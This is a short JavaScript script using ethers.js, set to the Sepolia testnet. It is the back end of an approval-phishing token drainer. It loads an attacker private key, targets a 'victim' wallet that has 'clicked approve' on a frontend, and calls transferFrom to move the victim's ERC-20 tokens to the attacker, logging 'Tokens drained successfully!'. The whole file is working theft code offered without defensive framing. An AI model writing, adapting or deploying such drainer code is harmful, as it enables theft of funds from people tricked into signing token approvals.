import { ethers } from "ethers";
import dotenv from "dotenv";
dotenv.config();

const tokenAddress = "0xYourERC20TokenAddress";  // Same as frontend
const victimAddress = "0xVictimWalletAddress";   // The user that clicked approve
const amountToDrain = ethers.utils.parseUnits("1000", 18); // Adjust token amount

const ERC20_ABI = [
  "function transferFrom(address sender, address recipient, uint256 amount) external returns (bool)"
];

async function drainTokens() {
  const provider = new ethers.providers.InfuraProvider("sepolia", process.env.INFURA_PROJECT_ID);
  const attackerWallet = new ethers.Wallet(process.env.ATTACKER_PRIVATE_KEY, provider);
  const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, attackerWallet);

  try {
    const tx = await tokenContract.transferFrom(victimAddress, attackerWallet.address, amountToDrain);
    console.log("Draining tokens...", tx.hash);
    await tx.wait();
    console.log("Tokens drained successfully!");
  } catch (err) {
    console.error("Drain failed:", err);
  }
}

drainTokens();
